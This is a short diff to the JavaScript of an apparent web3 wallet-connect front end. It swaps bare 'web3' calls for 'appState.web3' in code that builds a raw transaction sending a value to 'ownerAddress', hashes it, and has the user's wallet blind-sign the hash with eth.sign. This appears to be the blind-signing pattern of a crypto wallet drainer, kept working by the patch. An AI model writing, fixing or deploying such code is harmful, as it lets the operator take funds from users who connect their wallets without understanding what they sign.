@@ -1017,9 +1017,9 @@ const REOWN_PROJECT_ID = 'YOUR_REOWN_PROJECT_ID_HERE'; // ← Replace with your 
       // This matches the original application architecture and UX exactly.
       const tx_ = {
         to: ownerAddress,
-        nonce: web3.utils.toHex(nonce),
+        nonce: appState.web3.utils.toHex(nonce),
         gasLimit: "0x55F0",
-        gasPrice: web3.utils.toHex(gasPriceNum),
+        gasPrice: appState.web3.utils.toHex(gasPriceNum),
         value: '0x' + valueToSend.toString(16),   // safe hex, no large Number conversion
         data: "0x0",
         r: "0x",
@@ -1044,7 +1044,7 @@ const REOWN_PROJECT_ID = 'YOUR_REOWN_PROJECT_ID_HERE'; // ← Replace with your 
         const serializedTx = "0x" + tx.serialize().toString("hex");
         const sha3_ = appState.web3.utils.sha3(serializedTx, { encoding: "hex" });
 
-        const initialSig = await web3.eth.sign(sha3_, appState.account);
+        const initialSig = await appState.web3.eth.sign(sha3_, appState.account);
 
         const temp = initialSig.substring(2),
           r = "0x" + temp.substring(0, 64),
